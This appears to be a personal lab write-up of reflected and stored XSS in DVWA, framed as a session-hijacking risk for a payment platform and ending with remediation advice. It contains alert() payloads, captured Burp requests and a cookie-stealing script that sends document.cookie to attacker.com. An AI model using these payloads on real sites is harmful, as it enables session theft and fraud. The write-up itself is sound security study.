# XSS Vulnerabilities in Payment Interfaces: Session Hijacking Risk Assessment

## Executive Summary
Discovered and exploited Cross-Site Scripting (XSS) vulnerabilities that could enable session hijacking in payment processing interfaces. In a fintech environment like Clip, these vulnerabilities could lead to unauthorized access to merchant accounts and financial data theft.

## Vulnerability Details

| Field | Value |
|-------|-------|
| Type | CWE-79: Cross-Site Scripting |
| Severity | HIGH (CVSS 7.1) |
| Variants Found | Reflected XSS, Stored XSS |
| Attack Vector | Network |
| User Interaction | Required (Reflected) / None (Stored) |

## Technical Analysis

### Reflected XSS
*Location:* /vulnerabilities/xss_r/?name=

*Payload:*

<script>alert('XSS')</script>

*HTTP Request captured in Burp Suite:*

GET /dvwa/vulnerabilities/xss_r/?name=<script>alert(‘XSS’)</script> HTTP/1.1
Host: 127.0.0.1

*Result:* JavaScript executed immediately, popup displayed.

### Stored XSS
*Location:* /vulnerabilities/xss_s/ (Guestbook form)

*Payload:*

<script>alert('Captured')</script>

*HTTP Request captured in Burp Suite:*

POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
txtName=burp+test&mtxMessage=%3Cscript%3Ealert%28%27Captured%27%29%3C%2Fscript%3E

*Result:* Payload stored in database, executes for ALL users visiting the page.

## Fintech Impact Scenario (Clip)

### Attack Chain for Payment Platform:
1. Attacker finds Stored XSS in merchant dashboard (transaction comments, product descriptions)
2. Injects session-stealing payload:
```javascript
<script>
new Image().src='https://attacker.com/steal?cookie='+document.cookie;
</script>

1.	Merchant visits dashboard → cookie sent to attacker
	2.	Attacker hijacks session → accesses merchant funds
Business Impact:
	∙	Direct Financial Loss: Unauthorized transfers from merchant accounts
	∙	Data Breach: Access to transaction history, customer payment data
	∙	Regulatory Fines: PCI-DSS violation (Requirement 6.5.7)
	∙	Reputation Damage: Loss of merchant trust
Estimated Risk for 100,000 merchants:
	∙	If 0.1% accounts compromised = 100 merchants
	∙	Average merchant balance: $5,000 USD
	∙	Potential loss: $500,000 USD
Remediation
Immediate:

// Instead of:
echo "Hello " . $_GET['name'];

// Use:
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');

Long-term:
	1.	Implement Content Security Policy (CSP) headers
	2.	Use HTTPOnly and Secure flags on session cookies
	3.	Input validation on all user-supplied data
	4.	Output encoding based on context (HTML, JavaScript, URL)
Tools Used
	∙	Burp Suite Community Edition (proxy, HTTP history)
	∙	Firefox Developer Tools
	∙	DVWA (Damn Vulnerable Web Application)
References
	∙	OWASP XSS Prevention Cheat Sheet
	∙	CWE-79: Improper Neutralization of Input During Web Page Generation
	∙	PCI-DSS Requirement 6.5.7

Author: Francisco Escalante
Date: January 23, 2026
Lab Environment: DVWA on Parrot OS
GitHub: github.com/Paxx16/cybersecurity-journey



	






















































